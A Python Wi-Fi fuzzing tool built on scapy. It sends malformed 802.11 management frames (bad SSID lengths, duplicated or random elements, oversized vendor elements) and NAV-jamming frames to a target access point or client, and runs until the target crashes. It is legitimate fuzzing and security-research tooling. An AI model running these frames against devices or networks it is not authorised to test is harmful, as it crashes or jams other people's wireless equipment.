import random
import sys
import argparse
import time
from scapy.all import *

from DeviceHealthMonitor import DeviceHealthMonitor

class FrameFactory:
    @staticmethod
    def get_ssid_too_long():
        random_len = random.randint(0, 255)
        payload = random.randbytes(500)
        return Dot11Elt(ID=0, len=random_len, info=payload)
    @staticmethod
    def get_ssid_duplication():
        ssid = "TestSSID"
        return Dot11Elt(ID=0, len=len(ssid), info=ssid) / Dot11Elt(ID=0, len=len(ssid), info=ssid)
    @staticmethod
    def get_random_id():
        rid = random.randint(0, 255)
        return Dot11Elt(ID=rid, len=random.randint(150, 255), info=RandString(10))
    @staticmethod
    def get_nav_jamming():
        return random.randint(10000, 65535)
    @staticmethod
    def get_vendor_specific():
        random_len = random.randint(1, 255)
        return Dot11Elt(ID=221, len=random_len, info=random.randbytes(1000))

attacks = {
    "ssid-len": (0, 4, FrameFactory.get_ssid_too_long),
    "ssid-duplication": (0, 4, FrameFactory.get_ssid_duplication),
    "random-id": (0, 4, FrameFactory.get_random_id),
    "vendor-specific": (0, 4, FrameFactory.get_vendor_specific),
    "nav-jamming": (2, 4, FrameFactory.get_nav_jamming)
}

def send_malformed_frame(dev_mac, iface, dev_type, attack) -> None:
    """Sends a malformed frame to the target device based on the specified attack type."""
    client_mac = "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

    if dev_type == "AP":
        if attack not in attacks:
            return
        type, subtype, payload = attacks[attack]
        dot11 = Dot11(type=type, subtype=subtype, addr1="ff:ff:ff:ff:ff:ff", addr2=client_mac, addr3=dev_mac)
        packet = RadioTap() / dot11 / payload()
        sendp(packet, iface=iface, verbose=False)
        
    if dev_type == "STA":
        if attack not in attacks:
            return
        if attack == "nav-jamming":
            # For NAV jamming, it has to be a distinct case
            type, subtype, nav_time = attacks[attack]
            dot11 = Dot11(type=type, subtype=subtype, ID=nav_time, addr1=dev_mac, addr2=client_mac, addr3=dev_mac)
            packet = RadioTap() / dot11
            sendp(packet, iface=iface, verbose=False)
            return
        
        type, subtype, payload = attacks[attack]
        dot11 = Dot11(type=type, subtype=subtype, addr1=dev_mac, addr2=client_mac, addr3=dev_mac)
        packet = RadioTap() / dot11 / payload()
        sendp(packet, iface=iface, verbose=False)

    return

def main():
    parser = argparse.ArgumentParser(description="Wi-Fi Fuzzer tool.", epilog="Example usage: python fuzzer.py -a 02:00:00:00:00:00 -i wlan0")
    parser.add_argument("-a", "--ap-mac", help="MAC address of the targeted AP device")
    parser.add_argument("-c", "--client-mac", help="MAC address of the STA client device")
    parser.add_argument("-i", "--iface", default="wlan0", help="Wireless interface to use set to monitor mode (default: wlan0)")
    parser.add_argument("-m", "--mode", choices=["ssid-len", "ssid-duplication", "random-id", "vendor-specific", "nav-jamming"], default="ssid-len", help="Fuzzing mode: 'ssid-len' for probe requests, 'ssid-duplication' for duplicate SSIDs, 'random-id' for random element IDs (default: ssid-len)")
    parser.add_argument("--log-csv", action="store_true", help="Enable CSV logging of device health data")
    args = parser.parse_args()

    target_type = "AP" if args.ap_mac else "STA"

    device_mac = args.client_mac if args.client_mac else args.ap_mac
    if not device_mac:
        print("Error: You must specify either an AP MAC address or a client MAC address.")
        parser.print_help()
        sys.exit(1)

    print(f"[*] Starting fuzzing device {device_mac} on interface {args.iface}")
    print("[!] Press Ctrl+C to stop.")

    # Initialize the device health monitor
    monitor = DeviceHealthMonitor(device_mac, args.iface, target_type=target_type, log_csv=True if args.log_csv else False)
    monitor.start()

    count = 0
    try:
        while True:
            if not monitor.is_target_alive(timeout=10):
                print(f"[!] Target {device_mac} is not responding. Stopping fuzzing.")
                print(f"[*] Crash detected after {count} fuzzed frames.")
                if not monitor.active_probe():
                    print("[*] Active probe failed, confirming target is unresponsive.")
                    break
                else:
                    monitor.last_seen = time.time()  # Reset last seen to avoid false positives

            send_malformed_frame(device_mac, args.iface, target_type, args.mode)

            count += 1
            time.sleep(0.05)

            if count % 100 == 0:
                print(f"[*] Sent {count} malformed frames so far...")
                
    except KeyboardInterrupt:
        print("\nFuzzing stopped by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        print(f"\nStopping monitor.")
        monitor.stop()

if __name__ == "__main__":
    main()
    